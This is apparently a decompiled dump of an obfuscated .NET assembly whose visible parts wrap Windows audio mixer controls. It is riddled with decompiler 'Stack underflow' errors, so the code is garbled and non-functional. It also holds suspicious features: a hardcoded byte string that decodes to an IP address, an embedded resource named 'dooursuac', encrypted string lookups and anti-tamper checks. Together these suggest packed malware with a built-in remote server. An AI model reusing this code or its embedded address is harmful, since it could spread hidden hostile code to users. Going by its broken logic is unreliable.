			_001E = global::_000E._008A_0002(_0080._0014._0001(107395605), new char[1] { '|' })[0];
		}
	}
}
namespace _0007
{
	[DebuggerNonUserCode]
	[CompilerGenerated]
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
	internal sealed class _0001
	{
		private static ResourceManager m__0001;

		private static CultureInfo m__0001;

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static ResourceManager ResourceManager
		{
			get
			{
				//IL_004b: Incompatible stack heights: 0 vs 1
				//IL_0052: Incompatible stack heights: 0 vs 1
				bool flag = global::_0007._0001.m__0001 == null;
				if ((int)/*Error near IL_000f: Stack underflow*/ != 0)
				{
					_0080._0014._0001(107396088);
					ResourceManager resourceManager = (global::_0007._0001.m__0001 = new ResourceManager(assembly: _0092._007E_0081_0004(_0091._0080_0004(typeof(_0001).TypeHandle)), baseName: (string)/*Error near IL_0035: Stack underflow*/));
				}
				return global::_0007._0001.m__0001;
			}
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static CultureInfo Culture
		{
			get
			{
				//IL_0011: Incompatible stack heights: 0 vs 1
				CultureInfo cultureInfo = m__0001;
				return (CultureInfo)/*Error near IL_000d: Stack underflow*/;
			}
			set
			{
				//IL_000a: Incompatible stack heights: 0 vs 1
				m__0001 = (CultureInfo)/*Error near IL_0008: Stack underflow*/;
			}
		}

		internal static byte[] dooursuac
		{
			get
			{
				//IL_0027: Incompatible stack heights: 0 vs 2
				//IL_002e: Incompatible stack heights: 0 vs 1
				//IL_0035: Incompatible stack heights: 0 vs 1
				_ = _0093._007E_0082_0004;
				_ = ResourceManager;
				_0080._0014._0001(107396015);
				CultureInfo cultureInfo = m__0001;
				/*Error near IL_0035: Stack underflow*/((object)/*Error near IL_0035: Stack underflow*/, (string)/*Error near IL_0035: Stack underflow*/, cultureInfo);
				object obj = (object)/*Error near IL_0017: Stack underflow*/;
				return (byte[])obj;
			}
		}

		internal _0001()
		{
		}
	}
}
namespace _0018
{
	[CompilerGenerated]
	internal sealed class _0001
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 14)]
		private struct _0001
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 16)]
		private struct _0002
		{
		}

		internal static readonly _0002 _0001/* Not supported: data(0A 05 00 00 37 1A 00 00 E6 22 00 00 30 5D 00 00) */;

		internal static readonly _0001 _0001/* Not supported: data(31 38 35 2E 31 34 30 2E 35 33 2E 32 34 31) */;
	}
}
namespace _0005
{
	internal enum _0001
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 3,
		_0004 = 4,
		_0005 = 20,
		_0006 = 21,
		_0007 = 22,
		_0008 = 23,
		_000E = 24,
		_000F = 25,
		_0010 = 26,
		_0011 = 27,
		_0012 = 28,
		_0013 = 29,
		_0014 = 30,
		_0015 = 31,
		_0016 = 32,
		_0017 = 33,
		_0018 = 34,
		_0019 = 35,
		_001A = 36,
		_001B = 37,
		_001C = 38,
		_001D = 39,
		_001E = 40,
		_001F = 41,
		_007F = 42,
		_0080 = 43,
		_0081 = 44,
		_0082 = 45,
		_0083 = 46,
		_0084 = 47,
		_0086 = 48,
		_0087 = 49,
		_0088 = 50,
		_0089 = 51,
		_008A = 52,
		_008B = 53,
		_008C = 54,
		_008D = 55,
		_008E = 56,
		_008F = 57,
		_0090 = 58,
		_0091 = 59,
		_0092 = 60,
		_0093 = 61,
		_0094 = 62,
		_0095 = 63,
		_0096 = 64,
		_0097 = 65,
		_0098 = 66,
		_0099 = 67,
		_009A = 68,
		_009B = 69,
		_009C = 73,
		_009D = 74,
		_009E = 76,
		_009F = 77,
		_0001_0002 = 78,
		_0002_0002 = 79,
		_0003_0002 = 80,
		_0004_0002 = 81,
		_0005_0002 = 82,
		_0006_0002 = 83,
		_0007_0002 = 84,
		_0008_0002 = 85,
		_000E_0002 = 86,
		_000F_0002 = 87,
		_0010_0002 = 88,
		_0011_0002 = 89,
		_0012_0002 = 90,
		_0013_0002 = 91,
		_0014_0002 = 92,
		_0015_0002 = 93,
		_0016_0002 = 94,
		_0017_0002 = 95,
		_0018_0002 = 96,
		_0019_0002 = 97,
		_001A_0002 = 98,
		_001B_0002 = 99,
		_001C_0002 = 100,
		_001D_0002 = 101,
		_001E_0002 = 102,
		_001F_0002 = 103,
		_007F_0002 = 104,
		_0080_0002 = 105,
		_0081_0002 = 106,
		_0082_0002 = 107,
		_0083_0002 = 108,
		_0084_0002 = 109,
		_0086_0002 = 110,
		_0087_0002 = 111,
		_0088_0002 = 112,
		_0089_0002 = 113,
		_008A_0002 = 114,
		_008B_0002 = 115,
		_008C_0002 = 116,
		_008D_0002 = 117,
		_008E_0002 = 118,
		_008F_0002 = 119,
		_0090_0002 = 120,
		_0091_0002 = 121,
		_0092_0002 = 125,
		_0093_0002 = 126,
		_0094_0002 = 127,
		_0095_0002 = 128,
		_0096_0002 = 129,
		_0097_0002 = 130,
		_0098_0002 = 131,
		_0099_0002 = 132,
		_009A_0002 = 133,
		_009B_0002 = 134,
		_009C_0002 = 135,
		_009D_0002 = 136,
		_009E_0002 = 137,
		_009F_0002 = 138,
		_0001_0003 = 139,
		_0002_0003 = 140,
		_0003_0003 = 141,
		_0004_0003 = 142,
		_0005_0003 = 143,
		_0006_0003 = 144,
		_0007_0003 = 145,
		_0008_0003 = 146,
		_000E_0003 = 147,
		_000F_0003 = 148,
		_0010_0003 = 149,
		_0011_0003 = 150,
		_0012_0003 = 151,
		_0013_0003 = 152,
		_0014_0003 = 153,
		_0015_0003 = 154,
		_0016_0003 = 155,
		_0017_0003 = 156,
		_0018_0003 = 157,
		_0019_0003 = 158,
		_001A_0003 = 159,
		_001B_0003 = 160,
		_001C_0003 = 161,
		_001D_0003 = 162,
		_001E_0003 = 163,
		_001F_0003 = 164,
		_007F_0003 = 172
	}
}
namespace _0013
{
	internal sealed class _0001 : Exception
	{
		private MmResult m__0001;

		private string m__0001;

		public MmResult Result => ((_0001)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0001(MmResult _009E_0088, string _0011_0014_0006)
			: base(global::_0011._0018._0001(_009E_0088, _0011_0014_0006))
		{
			this.m__0001 = _009E_0088;
			m__0001 = _0011_0014_0006;
		}
	}
}
namespace _0015
{
	internal sealed class _0002 : _007F._0003
	{
		private new _0003._000E m__0001;

		public unsafe bool Value
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_001f: Incompatible stack heights: 0 vs 1
				((_007F._0003)/*Error near IL_001c: Stack underflow*/)._0001();
				return ((_0002)/*Error near IL_000b: Stack underflow*/).m__0001._0001 == 1;
			}
			set
			{
				//IL_00a8: Incompatible stack heights: 0 vs 1
				//IL_00ae: Incompatible stack heights: 0 vs 2
				//IL_00b4: Incompatible stack heights: 0 vs 1
				_ = ref ((_0002)/*Error near IL_000a: Stack underflow*/).m__0001;
				int num = (((int)/*Error near IL_0011: Stack underflow*/ != 0) ? 1 : 0);
				((_0003._000E*)(nint)/*Error near IL_001a: Stack underflow*/)->_0001 = num;
				((_007F._0003)/*Error near IL_0024: Stack underflow*/)._0001._0002 = _0099._008C_0004(_0098._0089_0004(this.m__0001));
				_009A._008F_0004(this.m__0001, base._0001._0002, false);
				global::_0011._0018._0001(global::_0011._0018._0001(base._0001, ref base._0001, _001D._0001._0002 | base._0001), _0080._0014._0001(107395985));
				_009B._0090_0004(base._0001._0002);
			}
		}

		internal _0002(_0003._0008 _001B_008F_0006, IntPtr _001C_008F_0006, _001D._0001 _001D_008F_0006, int _001E_008F_0006)
		{
			base._0001 = _001B_008F_0006;
			base._0001 = _001C_008F_0006;
			base._0001 = _001D_008F_0006;
			base._0001 = _001E_008F_0006;
			base._0001 = default(_0003._0001);
			_0001();
		}

		protected override void _0001(IntPtr _0002)
		{
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 2
			//IL_0030: Incompatible stack heights: 0 vs 1
			_ = _0097._0088_0004;
			_0091._0080_0004(typeof(_0003._000E).TypeHandle);
			_0003._000E obj = (_0003._000E)/*Error near IL_001a: Stack underflow*/((IntPtr)/*Error near IL_001a: Stack underflow*/, (Type)/*Error near IL_001a: Stack underflow*/);
			((_0002)/*Error near IL_0024: Stack underflow*/).m__0001 = obj;
		}

		static _0002()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _007F
{
	internal abstract class _0003
	{
		internal global::_0015._0003._0008 _0001;

		internal global::_0015._0003._0001 _0001;

		protected IntPtr _0001;

		protected int _0001;

		protected _001D._0001 _0001;

		public string Name => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0002;

		public MixerControlType ControlType => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001;

		public bool IsBoolean
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001(((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001);
				return (byte)/*Error near IL_000f: Stack underflow*/ != 0;
			}
		}

		public bool IsListText
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001(((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001);
				return (byte)/*Error near IL_000f: Stack underflow*/ != 0;
			}
		}

		public bool IsSigned
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001(((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001);
				return (byte)/*Error near IL_000f: Stack underflow*/ != 0;
			}
		}

		public bool IsUnsigned
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001(((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001);
				return (byte)/*Error near IL_000f: Stack underflow*/ != 0;
			}
		}

		public bool IsCustom => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001 == MixerControlType.Custom;

		protected unsafe void _0001()
		{
			//IL_024f: Incompatible stack heights: 0 vs 1
			//IL_0255: Incompatible stack heights: 0 vs 3
			//IL_025f: Incompatible stack heights: 0 vs 1
			_ = ref ((_0003)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = _0098._0089_0004;
			object obj = ((_0003)/*Error near IL_0019: Stack underflow*/)._0001;
			/*Error near IL_025f: Stack underflow*/(obj);
			((global::_0015._0003._0001*)(nint)/*Error near IL_0028: Stack underflow*/)->_0001 = (int)/*Error near IL_0028: Stack underflow*/;
			this._0001._0002 = this._0001._0001;
			if (IsCustom)
			{
				this._0001._0003 = 0;
			}
			else if ((this._0001._0002 & (true ? 1u : 0u)) != 0)
			{
				this._0001._0003 = 1;
			}
			else
			{
				this._0001._0003 = this._0001;
			}
			if ((this._0001._0002 & 2u) != 0)
			{
				this._0001._0001 = _009C._0092_0004(this._0001._0003);
			}
			else if (IsCustom)
			{
				this._0001._0001 = IntPtr.Zero;
			}
			else
			{
				this._0001._0001 = IntPtr.Zero;
			}
			if (IsBoolean)
			{
				this._0001._0004 = _0098._0089_0004(default(global::_0015._0003._000E));
			}
			else if (IsListText)
			{
				this._0001._0004 = _0098._0089_0004(default(global::_0015._0003._0010));
			}
			else if (IsSigned)
			{
				this._0001._0004 = _0098._0089_0004(default(global::_0015._0003._000F));
			}
			else if (IsUnsigned)
			{
				this._0001._0004 = _0098._0089_0004(default(global::_0015._0003._0011));
			}
			else
			{
				this._0001._0004 = this._0001._0001._0002;
			}
			int num = this._0001._0004 * this._0001._0003;
			if ((this._0001._0002 & 2u) != 0)
			{
				num *= (int)this._0001._0003;
			}
			IntPtr intPtr = _0099._008D_0004(num);
			this._0001._0002 = intPtr;
			MmResult mmResult = global::_0011._0018._0001(this._0001, ref this._0001, _001D._0001._0002 | this._0001);
			if (mmResult == MmResult.NoError)
			{
				_0001(this._0001._0002);
			}
			_009B._0091_0004(intPtr);
			if (mmResult != 0)
			{
				throw new global::_0013._0001(mmResult, _0080._0014._0001(107395886));
			}
		}

		protected abstract void _0001(IntPtr _0002);

		public override string ToString()
		{
			//IL_0034: Incompatible stack heights: 0 vs 2
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 2
			_ = _009D._0093_0004;
			_0080._0014._0001(107395853);
			_ = ((_0003)/*Error near IL_0013: Stack underflow*/)._0001._0002;
			object obj = ((_0003)/*Error near IL_001f: Stack underflow*/)._0001._0001;
			return /*Error near IL_002e: Stack underflow*/((string)/*Error near IL_002e: Stack underflow*/, (object)/*Error near IL_002e: Stack underflow*/, obj);
		}

		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
	internal sealed class _0002 : _0003
	{
		internal _0002(global::_0015._0003._0008 _001B_008F_0006, IntPtr _001C_008F_0006, _001D._0001 _001D_008F_0006, int _001E_008F_0006)
		{
			base._0001 = _001B_008F_0006;
			base._0001 = _001C_008F_0006;
			base._0001 = _001D_008F_0006;
			base._0001 = _001E_008F_0006;
			base._0001 = default(global::_0015._0003._0001);
			_0001();
		}

		protected override void _0001(IntPtr _0002)
		{
		}
	}
}
namespace _0003
{
	internal sealed class _0002 : _007F._0003
	{
		internal _0002(global::_0015._0003._0008 _001B_008F_0006, IntPtr _001C_008F_0006, _001D._0001 _001D_008F_0006, int _001E_008F_0006)
		{
			base._0001 = _001B_008F_0006;
			base._0001 = _001C_008F_0006;
			base._0001 = _001D_008F_0006;
			base._0001 = _001E_008F_0006;
			base._0001 = default(global::_0015._0003._0001);
			_0001();
		}

		protected override void _0001(IntPtr _0002)
		{
		}

		static _0002()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001B
{
	internal sealed class _0001
	{
		internal global::_0015._0003._0002 _0001;

		internal IntPtr _0001;

		internal _001D._0001 _0001;

		public static int NumberOfDevices
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				return (int)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public int DestinationCount => (int)((_001B._0001)/*Error near IL_0007: Stack underflow*/)._0001._0003;

		public string Name => ((_001B._0001)/*Error near IL_0007: Stack underflow*/)._0001._0001;

		public global::_0005._0001 Manufacturer => (global::_0005._0001)((_001B._0001)/*Error near IL_0007: Stack underflow*/)._0001._0001;

		public int ProductID => ((_001B._0001)/*Error near IL_0007: Stack underflow*/)._0001._0002;

		public IEnumerable<global::_0018._0003> Destinations
		{
			get
			{
				//IL_0011: Incompatible stack heights: 0 vs 3
				new _0001(-2);
				((_0001)/*Error near IL_000f: Stack underflow*/)._0001 = (_001B._0001)/*Error near IL_000f: Stack underflow*/;
				return (IEnumerable<global::_0018._0003>)/*Error near IL_0010: Stack underflow*/;
			}
		}

		public static IEnumerable<_001B._0001> Mixers
		{
			get
			{
				//IL_000a: Incompatible stack heights: 0 vs 1
				new _0002(-2);
				return (IEnumerable<_001B._0001>)/*Error near IL_0005: Stack underflow*/;
			}
		}

		public _0001(int _001F_008F_0006)
		{
			if (_001F_008F_0006 < 0 || _001F_008F_0006 >= NumberOfDevices)
			{
				throw new ArgumentOutOfRangeException(_0080._0014._0001(107395952));
			}
			this._0001 = default(global::_0015._0003._0002);
			global::_0011._0018._0001(global::_0011._0018._0001((IntPtr)_001F_008F_0006, ref this._0001, Marshal.SizeOf((object)this._0001)), _0080._0014._0001(107395907));
			this._0001 = (IntPtr)_001F_008F_0006;
			this._0001 = _001D._0001._0002;
		}
	}
}
namespace _0018
{
	internal sealed class _0003
	{
		internal global::_0015._0003._0005 _0001;

		internal IntPtr _0001;

		internal global::_001D._0001 _0001;

		public string Name => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0002;

		public string ShortName => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001;

		public int LineId => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0004;

		public global::_0017._0001 ComponentType => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001;

		public string TypeDescription
		{
			get
			{
				//IL_0167: Incompatible stack heights: 0 vs 1
				//IL_0173: Incompatible stack heights: 0 vs 1
				global::_0017._0001 obj = ((_0003)/*Error near IL_000a: Stack underflow*/)._0001._0001;
				return /*Error near IL_0042: Stack underflow*/switch
				{
					0L => _0080._0014._0001(107395303), 
					1L => _0080._0014._0001(107395274), 
					2L => _0080._0014._0001(107395245), 
					3L => _0080._0014._0001(107395212), 
					4L => _0080._0014._0001(107395183), 
					5L => _0080._0014._0001(107395186), 
					6L => _0080._0014._0001(107395153), 
					7L => _0080._0014._0001(107395124), 
					8L => _0080._0014._0001(107395091), 
					_ => obj switch
					{
						global::_0017._0001._000F => _0080._0014._0001(107395530), 
						global::_0017._0001._0010 => _0080._0014._0001(107395537), 
						global::_0017._0001._0011 => _0080._0014._0001(107395516), 
						global::_0017._0001._0012 => _0080._0014._0001(107395459), 
						global::_0017._0001._0013 => _0080._0014._0001(107395434), 
						global::_0017._0001._0014 => _0080._0014._0001(107395441), 
						global::_0017._0001._0015 => _0080._0014._0001(107395412), 
						global::_0017._0001._0016 => _0080._0014._0001(107395387), 
						global::_0017._0001._0017 => _0080._0014._0001(107395330), 
						global::_0017._0001._0018 => _0080._0014._0001(107394797), 
						global::_0017._0001._0019 => _0080._0014._0001(107394804), 
						_ => _0080._0014._0001(107394783), 
					}, 
				};
			}
		}

		public int Channels => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0005;

		public int SourceCount => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0006;

		public int ControlsCount => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0007;

		public bool IsActive => (((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001 & global::_0015._0003._0004._0001) != 0;

		public bool IsDisconnected => (((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001 & global::_0015._0003._0004._0002) != 0;

		public bool IsSource => (((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001 & global::_0015._0003._0004._0003) != 0;

		public IEnumerable<_007F._0003> Controls
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				IntPtr intPtr = ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;
				global::_001D._0001 obj = ((_0003)/*Error near IL_0010: Stack underflow*/)._0001;
				return global::_0011._0018._0001(obj, intPtr, this);
			}
		}

		public IEnumerable<_0003> Sources
		{
			get
			{
				//IL_0011: Incompatible stack heights: 0 vs 3
				new _0001(-2);
				((_0001)/*Error near IL_000f: Stack underflow*/)._0002 = (_0003)/*Error near IL_000f: Stack underflow*/;
				return (IEnumerable<_0003>)/*Error near IL_0010: Stack underflow*/;
			}
		}

		public string TargetName => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0003;

		public _0003(IntPtr _001C_008F_0006, int _007F_008F_0006, global::_001D._0001 _001D_008F_0006)
		{
			this._0001 = _001C_008F_0006;
			this._0001 = _001D_008F_0006;
			this._0001 = default(global::_0015._0003._0005);
			this._0001._0001 = Marshal.SizeOf((object)this._0001);
			this._0001._0002 = _007F_008F_0006;
			global::_0011._0018._0001(global::_0011._0018._0001(_001C_008F_0006, ref this._0001, _001D_008F_0006 | global::_001D._0001._0002), _0080._0014._0001(107395840));
		}

		public _0003(IntPtr _001C_008F_0006, int _007F_008F_0006, int _0080_008F_0006, global::_001D._0001 _001D_008F_0006)
		{
			this._0001 = _001C_008F_0006;
			this._0001 = _001D_008F_0006;
			this._0001 = default(global::_0015._0003._0005);
			this._0001._0001 = Marshal.SizeOf((object)this._0001);
			this._0001._0002 = _007F_008F_0006;
			this._0001._0003 = _0080_008F_0006;
			global::_0011._0018._0001(global::_0011._0018._0001(_001C_008F_0006, ref this._0001, _001D_008F_0006 | global::_001D._0001._0013), _0080._0014._0001(107395840));
		}

		public override string _0005()
		{
			//IL_005c: Incompatible stack heights: 0 vs 2
			//IL_005f: Incompatible stack heights: 0 vs 4
			//IL_0062: Incompatible stack heights: 0 vs 3
			_ = _009E._0094_0004;
			_0080._0014._0001(107394750);
			_ = new object[4];
			_ = 0;
			string text = ((_0003)/*Error near IL_001b: Stack underflow*/)._0001._0002;
			((object[])/*Error near IL_0021: Stack underflow*/)[/*Error near IL_0021: Stack underflow*/] = text;
			/*Error near IL_0021: Stack underflow*/;
			_ = 1;
			string text2 = ((_0003)/*Error near IL_002a: Stack underflow*/).TypeDescription;
			((object[])/*Error near IL_002b: Stack underflow*/)[/*Error near IL_002b: Stack underflow*/] = text2;
			((object[])/*Error near IL_002b: Stack underflow*/)[2] = this._0001._0007;
			((object[])/*Error near IL_003e: Stack underflow*/)[3] = this._0001._0004;
			return /*Error near IL_0056: Stack underflow*/((string)/*Error near IL_0056: Stack underflow*/, (object[])/*Error near IL_0056: Stack underflow*/);
		}
	}
}
namespace _001C
{
	[Flags]
	internal enum _0001
	{
		_0001 = 0,
		_0002 = 0x10000000,
		_0003 = 0x20000000,
		_0004 = 0x30000000,
		_0005 = 0x40000000,
		_0006 = 0x50000000,
		_0007 = 0x60000000,
		_0008 = 0x70000000,
		_000E = 0x70000000
	}
}
namespace _0018
{
	[Flags]
	internal enum _0002
	{
		_0001 = 0,
		_0002 = 0x1000000,
		_0003 = 0,
		_0004 = 0,
		_0005 = 0x1000000,
		_0006 = 0,
		_0007 = 0x1000000,
		_0008 = 0xF000000
	}
}
namespace _001C
{
	[Flags]
	internal enum _0002
	{
		_0001 = 0,
		_0002 = 0x10000,
		_0003 = 0x20000,
		_0004 = 0x30000,
		_0005 = 0x40000,
		_0006 = 0x50000,
		_0007 = 0xFF0000
	}
}
namespace _001D
{
	[Flags]
	internal enum _0001
	{
		_0001 = int.MinValue,
		_0002 = 0,
		_0003 = int.MinValue,
		_0004 = 0x10000000,
		_0005 = -1879048192,
		_0006 = 0x20000000,
		_0007 = -1610612736,
		_0008 = 0x30000000,
		_000E = -1342177280,
		_000F = 0x40000000,
		_0010 = -1073741824,
		_0011 = 0x50000000,
		_0012 = 0,
		_0013 = 1,
		_0014 = 0xF,
		_0015 = 0,
		_0016 = 1,
		_0017 = 2,
		_0018 = 0,
		_0019 = 1,
		_001A = 2,
		_001B = 3,
		_001C = 4,
		_001D = 0xF
	}
}
namespace _0015
{
	internal sealed class _0003
	{
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto, Pack = 1)]
		public struct _0001
		{
			public int _0001;

			public int _0002;

			public int _0003;

			public IntPtr _0001;

			public int _0004;

			public IntPtr _0002;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct _0002
		{
			public ushort _0001;

			public ushort _0002;

			public uint _0001;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string _0001;

			public uint _0002;

			public uint _0003;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct _0003
		{
			public int _0001;

			public int _0002;

			public int _0003;

			public int _0004;

			public int _0005;

			public IntPtr _0001;
		}

		[Flags]
		public enum _0004
		{
			_0001 = 1,
			_0002 = 0x8000,
			_0003 = int.MinValue
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct _0005
		{
			public int _0001;

			public int _0002;

			public int _0003;

			public int _0004;

			public _0004 _0001;

			public IntPtr _0001;

			public global::_0017._0001 _0001;

			public int _0005;

			public int _0006;

			public int _0007;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 16)]
			public string _0001;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 64)]
			public string _0002;

			public uint _0001;

			public uint _0002;

			public ushort _0001;

			public ushort _0002;

			public uint _0003;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string _0003;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct _0006
		{
			public int _0001;

			public int _0002;

			public int _0003;

			public int _0004;

			public int _0005;

			public int _0006;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct _0007
		{
			public int _0001;

			public int _0002;

			public int _0003;

			public int _0004;

			public int _0005;

			public int _0006;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct _0008
		{
			public uint _0001;

			public int _0001;

			public MixerControlType _0001;

			public uint _0002;

			public uint _0003;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 16)]
			public string _0001;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 64)]
			public string _0002;

			public _0006 _0001;

			public _0007 _0001;
		}

		public struct _000E
		{
			public int _0001;
		}

		public struct _000F
		{
			public int _0001;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct _0010
		{
			public uint _0001;

			public uint _0002;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 64)]
			public string _0001;
		}

		public struct _0011
		{
			public uint _0001;
		}

		public const uint _0001 = 1u;

		public const uint _0002 = 2u;

		public const uint _0003 = 2147483648u;

		public const int _0001 = 32;

		public const int _0002 = 16;

		public const int _0003 = 64;

		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0017
{
	internal enum _0001
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 3,
		_0005 = 4,
		_0006 = 5,
		_0007 = 6,
		_0008 = 7,
		_000E = 8,
		_000F = 4096,
		_0010 = 4097,
		_0011 = 4098,
		_0012 = 4099,
		_0013 = 4100,
		_0014 = 4101,
		_0015 = 4102,
		_0016 = 4103,
		_0017 = 4104,
		_0018 = 4105,
		_0019 = 4106
	}
}
namespace _0013
{
	internal sealed class _0002 : _007F._0003
	{
		private new global::_0015._0003._000F m__0001;

		public unsafe int Value
		{
			get
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_001c: Incompatible stack heights: 0 vs 1
				((_007F._0003)/*Error near IL_0019: Stack underflow*/)._0001();
				return ((_0002)/*Error near IL_000b: Stack underflow*/).m__0001._0001;
			}
			set
			{
				//IL_00a2: Incompatible stack heights: 0 vs 1
				//IL_00a8: Incompatible stack heights: 0 vs 2
				//IL_00ae: Incompatible stack heights: 0 vs 1
				_ = ref ((_0002)/*Error near IL_000a: Stack underflow*/).m__0001;
				((global::_0015._0003._000F*)(nint)/*Error near IL_0014: Stack underflow*/)->_0001 = (int)/*Error near IL_0014: Stack underflow*/;
				((_007F._0003)/*Error near IL_001e: Stack underflow*/)._0001._0002 = _0099._008C_0004(_0098._0089_0004(this.m__0001));
				_009A._008F_0004(this.m__0001, base._0001._0002, false);
				global::_0011._0018._0001(global::_0011._0018._0001(base._0001, ref base._0001, _001D._0001._0002 | base._0001), _0080._0014._0001(107395985));
				_009B._0090_0004(base._0001._0002);
			}
		}

		public int MinValue => ((_007F._0003)/*Error near IL_0007: Stack underflow*/)._0001._0001._0001;

		public int MaxValue => ((_007F._0003)/*Error near IL_0007: Stack underflow*/)._0001._0001._0002;

		public double Percent
		{
			get
			{
				//IL_001e: Unknown result type (might be due to invalid IL or missing references)
				//IL_0020: Unknown result type (might be due to invalid IL or missing references)
				//IL_0043: Unknown result type (might be due to invalid IL or missing references)
				//IL_0045: Expected F8, but got Unknown
				//IL_0046: Incompatible stack heights: 0 vs 2
